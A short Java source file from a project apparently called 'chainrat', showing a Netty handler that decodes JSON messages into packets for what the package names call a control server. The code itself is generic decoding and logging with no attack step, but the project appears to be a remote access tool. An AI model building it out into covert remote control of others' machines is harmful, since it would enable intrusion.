package com.nefi.chainrat.server.network.ControlServer.CommandHandler;

import com.google.common.base.Charsets;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.nefi.chainrat.server.Main;
import com.nefi.chainrat.server.network.ControlServer.packets.Packet;
import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

public class JsonDecoderHandler extends ChannelInboundHandlerAdapter {
    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        ByteBuf buf = (ByteBuf) msg;
        String sMessage = buf.toString(Charsets.UTF_8);

        GsonBuilder gsonBuilder = new GsonBuilder();
        Gson gson = gsonBuilder.create();
        Packet packet = gson.fromJson(sMessage, Packet.class);

        Main.getLog().d(this, packet.type.name());

        ctx.fireChannelRead(packet);
    }
}
